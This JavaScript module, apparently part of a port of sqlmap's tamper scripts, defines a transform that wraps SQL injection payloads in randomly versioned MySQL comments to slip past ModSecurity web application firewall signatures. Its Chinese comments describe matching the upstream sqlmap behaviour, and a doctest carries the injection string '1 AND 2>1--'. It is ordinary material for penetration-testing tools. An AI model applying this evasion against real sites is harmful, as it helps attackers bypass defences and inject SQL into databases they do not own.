// 上游形态变体（T-6，对标 sqlmap 1.10.10 modsecurityversioned.py）：首个空格后**整段**包进
// 一个带随机版本号的单条版本注释 `/*!30XXX ... */`（随机 3 位对齐上游 randomInt(3) 量级，
// 防止固定版本号被签名式剥离），注释截断后缀（#/--//*）原样保留。
// 与本仓 modsecurityversioned（逐关键词 `/*! AND */`、无版本号）形态不同族。
// 是否替换默认，由 modsec-live 真机 A/B 定 ⇒ 本件不动默认链（批次 D13）。
export const modsecurityversionedblock = {
  name: 'modsecurityversionedblock',
  description: '将首词后的整段包进单条 /*!30XXX...*/ 随机版本注释（上游形态；ModSecurity 绕过族）',
  doctests: [
    // 输出含随机版本号 ⇒ 按仓规用 match 形态（30 + 随机 3 位 = 5 位版本数字）
    { input: '1 AND 2>1--', match: '^1 \\/\\*!30\\d{3}AND 2>1\\*\\/--$' },
  ],
  dbms: ['MySQL'], // [P1-FIX] 方言限定：异构库下无效，运行时告警
  /**
   * @param {string} payload
   * @param {object} ctx
   * @returns {string}
   */
  transform(payload, ctx) {
    const rng = (ctx && typeof ctx.rng === 'function') ? ctx.rng : Math.random;
    const original = String(payload ?? '');
    if (!original) return original;
    let body = original;
    let postfix = '';
    for (const marker of ['#', '--', '/*']) {
      const idx = body.indexOf(marker);
      if (idx !== -1) {
        postfix = body.slice(idx);
        body = body.slice(0, idx);
        break;
      }
    }
    const sp = body.indexOf(' ');
    if (sp === -1) return original; // 上游：无空格 ⇒ 原样返回（retVal 未被重赋值）
    const rnd = String(100 + Math.floor(rng() * 900)); // 3 位十进制
    return `${body.slice(0, sp)} /*!30${rnd}${body.slice(sp + 1)}*/${postfix}`;
  },
};

export default modsecurityversionedblock;
